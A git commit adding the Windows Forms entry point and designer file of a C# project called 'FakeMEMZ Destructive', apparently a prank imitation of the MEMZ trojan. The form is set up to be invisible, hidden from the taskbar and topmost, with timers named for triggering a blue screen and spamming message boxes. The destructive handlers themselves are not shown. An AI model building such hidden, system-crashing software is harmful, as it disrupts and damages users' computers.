6b27eaeb4bb8418eb96f2050bbd7b0b3f8871050
Mist <59188378+Mist0090@users.noreply.github.com>
2021-11-07 15:16:13 +0900

    Add files via upload

---
+++ FakeMEMZ Destructive/Kill MEMZ to bluescreen/Kill MEMZ to bluescreen/Program.cs
@@ -0,0 +1,21 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Windows.Forms;
+
+namespace Kill_MEMZ_to_bluescreen
+{
+    static class Program
+    {
+        /// <summary>
+        /// アプリケーションのメイン エントリ ポイントです。
+        /// </summary>
+        [STAThread]
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new kill_memz_to_bluescreen());
+        }
+    }
+}
---
+++ FakeMEMZ Destructive/Kill MEMZ to bluescreen/Kill MEMZ to bluescreen/killMEMZtoBluescreen.Designer.cs
@@ -0,0 +1,75 @@
+﻿
+namespace Kill_MEMZ_to_bluescreen
+{
+    partial class kill_memz_to_bluescreen
+    {
+        /// <summary>
+        /// 必要なデザイナー変数です。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 使用中のリソースをすべてクリーンアップします。
+        /// </summary>
+        /// <param name="disposing">マネージド リソースを破棄する場合は true を指定し、その他の場合は false を指定します。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows フォーム デザイナーで生成されたコード
+
+        /// <summary>
+        /// デザイナー サポートに必要なメソッドです。このメソッドの内容を
+        /// コード エディターで変更しないでください。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.bsod = new System.Windows.Forms.Timer(this.components);
+            this.MsgBox = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+            // 
+            // bsod
+            // 
+            this.bsod.Interval = 5000;
+            this.bsod.Tick += new System.EventHandler(this.bsod_Tick);
+            // 
+            // MsgBox
+            // 
+            this.MsgBox.Interval = 50;
+            this.MsgBox.Tick += new System.EventHandler(this.Msg_Tick);
+            // 
+            // kill_memz_to_bluescreen
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(10F, 18F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
+            this.ClientSize = new System.Drawing.Size(10, 10);
+            this.ControlBox = false;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "kill_memz_to_bluescreen";
+            this.Opacity = 0D;
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.TopMost = true;
+            this.WindowState = System.Windows.Forms.FormWindowState.Minimized;
+            this.Load += new System.EventHandler(this.kill_memz_to_bluescreen_Load);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Timer bsod;
+        private System.Windows.Forms.Timer MsgBox;
+    }
+}
+
